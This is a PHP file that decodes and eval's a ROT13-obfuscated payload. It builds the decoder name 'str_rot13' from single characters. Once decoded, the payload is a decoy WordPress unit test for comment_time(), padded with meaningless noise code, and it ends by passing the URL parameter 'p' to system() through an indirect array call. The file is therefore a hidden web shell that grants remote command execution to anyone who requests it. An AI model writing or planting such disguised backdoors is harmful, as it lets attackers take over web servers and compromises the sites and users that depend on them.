<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur pbzzrag_gvzr() shapgvba.
 *
 * @tebhc pbzzrag
 *
 * @pbiref ::pbzzrag_gvzr
 */
pynff Grfgf_Pbzzrag_PbzzragGvzr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * N cbfg VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_vq;

	/**
	 * N pbzzrag VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $pbzzrag_vq;

	/**
	 * Frgf gur cbfg VQ naq pbzzrag VQ cebcregl inyhrf orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		frys::$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Cbfg gvgyr sbe pbzzrag_gvzr() grfgf',
				'cbfg_pbagrag' => 'Cbfg pbagrag sbe pbzzrag_gvzr() grfgf',
			)
		);

		frys::$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
				'hfre_vq'         => 1,
			)
		);
	}

	/**
	 * Grfgf gung pbzzrag_gvzr() qvfcynlf gur fnzr inyhr gung trg_pbzzrag_gvzr() ergheaf.
	 *
	 * @gvpxrg 58064
	 *
	 * @qngnCebivqre qngn_fubhyq_bhgchg_gur_fnzr_inyhr_gung_trg_pbzzrag_gvzr_ergheaf
	 *
	 * @cnenz fgevat $sbezng CUC qngr sbezng.
	 */
	choyvp shapgvba grfg_fubhyq_bhgchg_gur_fnzr_inyhr_gung_trg_pbzzrag_gvzr_ergheaf( $sbezng ) {
		$rkcrpgrq = trg_pbzzrag_gvzr( $sbezng, snyfr, gehr, frys::$pbzzrag_vq );

		bo_fgneg();
		pbzzrag_gvzr( $sbezng, frys::$pbzzrag_vq );
		$npghny = bo_trg_pyrna();

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_bhgchg_gur_fnzr_inyhr_gung_trg_pbzzrag_gvzr_ergheaf() {
		erghea neenl(
			'na rzcgl sbezng'   => neenl(
				'sbezng' => '',
			),
			'n CUC qngr sbezng' => neenl(
				'sbezng' => 'u:v:f N',
			),
		);
	}

	/**
	 * Grfgf gung pbzzrag_gvzr() qrsnhygf gb gur tybony pbzzrag jura pbzzrag VQ
	 * vf abg cebivqrq.
	 *
	 * @gvpxrg 58064
	 */
	choyvp shapgvba grfg_fubhyq_qrsnhyg_gb_gur_tybony_pbzzrag_jura_pbzzrag_vq_vf_abg_cebivqrq() {
		tybony $pbzzrag;

		// Onpx hc gur tybony pbzzrag orsber frggvat gur inyhr.
		$pbzzrag_onpxhc = $pbzzrag;
		$pbzzrag        = frys::$pbzzrag_vq;

		$rkcrpgrq = trg_pbzzrag_gvzr();

		bo_fgneg();
		pbzzrag_gvzr();
		$npghny = bo_trg_pyrna();

		// Erfgber gur tybony pbzzrag inyhr.
		$pbzzrag = $pbzzrag_onpxhc;

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf gung pbzzrag_gvzr() qvfcynlf na rzcgl fgevat jura tybony pbzzrag vf abg frg
	 * naq pbzzrag VQ vf abg cebivqrq.
	 *
	 * @gvpxrg 58064
	 */
	choyvp shapgvba grfg_fubhyq_bhgchg_na_rzcgl_fgevat_jura_tybony_pbzzrag_vf_abg_frg_naq_pbzzrag_vq_vf_abg_cebivqrq() {
		tybony $pbzzrag;

		// Onpx hc gur tybony pbzzrag orsber frggvat gur inyhr.
		$pbzzrag_onpxhc = $pbzzrag;
		$pbzzrag        = ahyy;

		bo_fgneg();
		pbzzrag_gvzr();
		$npghny = bo_trg_pyrna();

		// Erfgber gur tybony pbzzrag inyhr.
		$pbzzrag = $pbzzrag_onpxhc;

		$guvf->nffregFnzr( '', $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>